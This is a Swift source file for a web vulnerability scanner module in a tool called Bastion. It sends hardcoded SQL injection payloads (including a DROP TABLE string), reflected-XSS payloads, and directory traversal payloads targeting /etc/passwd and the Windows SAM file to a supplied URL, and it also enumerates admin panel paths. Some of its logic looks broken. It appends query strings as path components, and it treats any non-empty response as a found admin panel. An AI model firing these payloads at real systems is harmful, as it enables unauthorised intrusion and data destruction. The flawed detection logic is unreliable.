//
//  WebModule.swift
//  Bastion
//
//  Web vulnerability testing module
//  Tests for SQL injection, XSS, directory traversal, etc.
//  Author: Jordan Koch
//  Date: 2025-01-17
//

import Foundation

@MainActor
class WebModule: ObservableObject {
    @Published var testLog: [String] = []
    @Published var isRunning = false

    // SQL injection payloads
    private let sqlInjectionPayloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin' --",
        "' UNION SELECT NULL--",
        "1' AND '1'='1",
        "' OR 'x'='x",
        "'; DROP TABLE users--"
    ]

    // XSS payloads
    private let xssPayloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "\"><script>alert('XSS')</script>"
    ]

    // Directory traversal payloads
    private let traversalPayloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam"
    ]

    // Test for SQL injection
    func testSQLInjection(url: URL) async -> AttackResult {
        var result = AttackResult(targetIP: url.host ?? "unknown", attackType: .sqlInjection, module: "Web")
        addLog("Testing SQL injection on \(url.absoluteString)")

        SafetyValidator.shared.logActivity("SQL injection test", target: url.absoluteString)

        for payload in sqlInjectionPayloads {
            let testURL = url.appendingPathComponent("?id=\(payload)")

            if let response = await performHTTPRequest(url: testURL) {
                if detectSQLError(in: response) {
                    result.status = .success
                    result.vulnerabilityConfirmed = true
                    result.details = "✓ SQL injection vulnerability detected with payload: \(payload)"
                    result.evidence.append("Response contained SQL error: \(response.prefix(200))")
                    addLog("⚠️ SQL INJECTION FOUND: \(payload)")

                    return result
                }
            }

            try? await Task.sleep(nanoseconds: 200_000_000) // 0.2s delay
        }

        result.status = .failed
        result.details = "No SQL injection vulnerabilities detected"
        addLog("SQL injection test complete - no vulnerabilities")

        return result
    }

    // Test for XSS
    func testXSS(url: URL) async -> AttackResult {
        var result = AttackResult(targetIP: url.host ?? "unknown", attackType: .xss, module: "Web")
        addLog("Testing XSS on \(url.absoluteString)")

        SafetyValidator.shared.logActivity("XSS test", target: url.absoluteString)

        for payload in xssPayloads {
            let testURL = url.appendingPathComponent("?q=\(payload.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? payload)")

            if let response = await performHTTPRequest(url: testURL) {
                if response.contains(payload) {
                    result.status = .success
                    result.vulnerabilityConfirmed = true
                    result.details = "✓ Reflected XSS vulnerability detected"
                    result.evidence.append("Payload reflected in response: \(payload)")
                    addLog("⚠️ XSS VULNERABILITY FOUND")

                    return result
                }
            }

            try? await Task.sleep(nanoseconds: 200_000_000)
        }

        result.status = .failed
        result.details = "No XSS vulnerabilities detected"
        addLog("XSS test complete - no vulnerabilities")

        return result
    }

    // Test for directory traversal
    func testDirectoryTraversal(url: URL) async -> AttackResult {
        var result = AttackResult(targetIP: url.host ?? "unknown", attackType: .directoryTraversal, module: "Web")
        addLog("Testing directory traversal on \(url.absoluteString)")

        SafetyValidator.shared.logActivity("Directory traversal test", target: url.absoluteString)

        for payload in traversalPayloads {
            let testURL = url.appendingPathComponent(payload)

            if let response = await performHTTPRequest(url: testURL) {
                if response.contains("root:") || response.contains("[boot loader]") {
                    result.status = .success
                    result.vulnerabilityConfirmed = true
                    result.details = "✓ Directory traversal vulnerability detected"
                    result.evidence.append("Successfully accessed: \(payload)")
                    addLog("⚠️ DIRECTORY TRAVERSAL FOUND: \(payload)")

                    return result
                }
            }

            try? await Task.sleep(nanoseconds: 200_000_000)
        }

        result.status = .failed
        result.details = "No directory traversal vulnerabilities detected"
        addLog("Directory traversal test complete - no vulnerabilities")

        return result
    }

    // Test for default admin panels
    func testAdminAccess(baseURL: URL) async -> AttackResult {
        var result = AttackResult(targetIP: baseURL.host ?? "unknown", attackType: .webVulnScan, module: "Web")
        addLog("Checking for admin panels on \(baseURL.absoluteString)")

        let adminPaths = [
            "/admin", "/administrator", "/wp-admin", "/phpmyadmin",
            "/admin.php", "/login", "/console", "/dashboard"
        ]

        for path in adminPaths {
            let testURL = baseURL.appendingPathComponent(path)

            if let response = await performHTTPRequest(url: testURL), response.count > 0 {
                result.vulnerabilityConfirmed = true
                result.details += "Found admin panel: \(path)\n"
                result.evidence.append("Accessible admin path: \(path)")
                addLog("Found admin panel: \(path)")
            }

            try? await Task.sleep(nanoseconds: 100_000_000)
        }

        if result.vulnerabilityConfirmed {
            result.status = .success
        } else {
            result.status = .failed
            result.details = "No admin panels found"
        }

        return result
    }

    // Perform HTTP request
    private func performHTTPRequest(url: URL) async -> String? {
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        request.httpMethod = "GET"

        do {
            let (data, _) = try await URLSession.shared.data(for: request)
            return String(data: data, encoding: .utf8)
        } catch {
            return nil
        }
    }

    // Detect SQL errors in response
    private func detectSQLError(in response: String) -> Bool {
        let sqlErrors = [
            "sql syntax",
            "mysql_fetch",
            "postgresql",
            "ora-00",
            "sqlite",
            "sql error",
            "database error",
            "warning: mysql",
            "unclosed quotation",
            "syntax error"
        ]

        let lowercaseResponse = response.lowercased()
        return sqlErrors.contains { lowercaseResponse.contains($0) }
    }

    private func addLog(_ message: String) {
        let timestamp = Date().formatted(date: .omitted, time: .standard)
        testLog.append("[\(timestamp)] \(message)")
    }
}
